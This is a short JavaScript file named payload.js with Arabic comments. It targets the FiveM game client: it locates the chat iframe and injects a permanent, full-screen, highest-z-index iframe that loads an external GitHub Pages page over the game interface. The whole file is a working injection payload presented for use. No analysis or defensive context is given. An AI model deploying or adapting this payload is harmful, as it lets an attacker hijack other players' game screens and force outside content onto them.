// =========================================================
// **ملف: payload.js** - (فتح صفحة بملء الشاشة فوراً وبدون اتصال)
// =========================================================

(function() {
    const TARGET_PAGE = "https://dfjgiufdhgui.github.io/test/index.html";
    const FRAME_ID = "permanent_full_view";

    function inject() {
        // 1. البحث عن إطار الشات الرئيسي في FiveM
        const chatIframe = top.document.getElementsByName("chat")[0];
        if (!chatIframe) {
            // إذا لم يجد الشات، يحاول مرة أخرى بعد قليل (لضمان تحميل الواجهة)
            setTimeout(inject, 500);
            return;
        }

        const doc = chatIframe.contentDocument || chatIframe.contentWindow.document;

        // 2. منع التكرار
        if (doc.getElementById(FRAME_ID)) return;

        // 3. إنشاء الإطار (Iframe)
        const iframe = doc.createElement("iframe");
        iframe.id = FRAME_ID;
        iframe.src = TARGET_PAGE;

        // 4. تنسيق ملء الشاشة (فوق كل شيء ودائم)
        iframe.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 2147483647; 
            background: black;
            display: block !important;
        `;

        // 5. الحقن في واجهة اللعبة
        doc.body.appendChild(iframe);
        console.log("Page Injected Successfully.");
    }

    // البدء فور تحميل البايلود
    inject();
})();
